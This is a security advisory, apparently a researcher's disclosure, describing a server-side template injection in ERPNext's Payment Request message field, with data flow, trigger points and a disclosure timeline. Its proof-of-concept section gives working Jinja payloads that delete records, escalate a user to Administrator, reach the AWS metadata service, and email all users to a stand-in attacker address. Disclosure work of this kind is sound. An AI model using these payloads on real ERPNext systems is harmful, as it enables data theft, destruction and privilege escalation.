https://github.com/frappe/erpnext/

# Systemic Server-Side Template (SSTI) in ERPNext Payment Request message


## Summary
The `message` field on the `Payment Request` doctype is a user-editable `Text` field (permlevel 0,
writable by `Accounts User`). On email dispatch, its value is passed directly to
`frappe.render_template(self.message, context)`. The Jinja2 environment is `SandboxedEnvironment`
but has `get_safe_globals()` injected as globals, exposing:
- `frappe.delete_doc` -- delete any Frappe document
- `frappe.db.set_value` -- write arbitrary values to any DB table/column
- `frappe.make_get_request` / `make_post_request` -- SSRF to internal services
- `frappe.sendmail` -- send email as the server
- `frappe.call` -- invoke any `@frappe.whitelist()` endpoint
- `frappe.get_doc` / `new_doc` / `get_list` -- read/create arbitrary documents
The `safe_render` check (`if ".__" in template: throw(...)`) only blocks dunder access in
the raw string -- it does not prevent any of the above function calls.
---
## Data Flow
```
Accounts User (write perm on Payment Request)
  → sets Payment Request.message = "{{ frappe.delete_doc('Customer', 'CUST-001') }}"
  → saves document (after_insert trigger) OR calls resend_payment_email(docname)
    → PaymentRequest.send_email()
      → PaymentRequest.get_message()         # payment_request.py:611
        → frappe.render_template(            # payment_request.py:621
            self.message,                    # attacker-controlled Jinja2 template
            context={                        # context includes full doc objects
              "doc": frappe.get_doc(...),
              "payment_url": ...,
              "payment_request": self,
            }
          )
          → FrappeSandboxedEnvironment.from_string(template).render(context)
            # globals include get_safe_globals() -- delete_doc, db.set_value, SSRF, etc.
```
---
## Trigger Points
1. **Automatic**: `after_insert()` → `send_email()` fires when a Payment Request is saved
   with `payment_channel == "Email"` and `mute_email` not set.
2. **Manual**: `@frappe.whitelist()` endpoint `resend_payment_email(docname)` (line 1113)
   -- any authenticated user with read access to the document can call it.
---
## Jinja Environment Evidence
From `frappe/utils/jinja.py` (HEAD):
```python
def get_jenv():
    ...
    jenv.globals.update(get_safe_globals())   # ALL dangerous globals injected
```
From `frappe/utils/safe_exec.py`:
```python
frappe=NamespaceDict(
    delete_doc=delete_doc,
    make_get_request=frappe.integrations.utils.make_get_request,
    make_post_request=frappe.integrations.utils.make_post_request,
    db=NamespaceDict(
        set_value=frappe.db.set_value,   # unrestricted writes
        sql=read_sql,                    # SELECT-only guard
        ...
    ),
    sendmail=frappe.sendmail,
    ...
)
```
---
## Proof-of-Concept Payloads
**Delete a document:**
```
{{ frappe.delete_doc("Customer", "CUST-0001") }}
```
**Escalate to Administrator role (privilege escalation):**
```
{{ frappe.db.set_value("User", "victim@company.com", "role_profile_name", "Administrator") }}
```
**SSRF to AWS metadata:**
```
{{ frappe.make_get_request("http://169.254.169.254/latest/meta-data/") }}
```
**Exfiltrate all users:**
```
{{ frappe.sendmail(recipients="attacker@evil.com", subject="users", message=frappe.get_list("User")|string) }}
```
---
## Prerequisites
- Authenticated session
- `Accounts User` or `Accounts Manager` role
- Payment Request doctype must be in scope (standard ERPNext installation)
---
## Impact
- **Integrity**: Delete or modify any document (customers, invoices, users, items)
- **Confidentiality**: Read any document via `get_list`/`get_doc`, exfiltrate via `sendmail`
- **Privilege escalation**: Write `role_profile_name` or `roles` via `db.set_value` to gain Admin
- **SSRF**: `make_get_request`/`make_post_request` hit internal services (AWS metadata, Redis, etc.)
- **Scope**: Changed -- attacker can affect resources beyond Payment Request


## Disclosure
 - 10 May 2026 - reported via email
 - 7 June 2026 - vendor confirmed patch: https://github.com/frappe/frappe/pull/37924
 - 7 June 2026 - followed up on advisory
 - 16 September 2026 - followed up again
 - 17 November 2026 - no response; disclosed
   
<img width="1244" height="313" alt="image" src="https://github.com/user-attachments/assets/f286f7a0-9831-4ddf-8074-2278aa5886ad" />
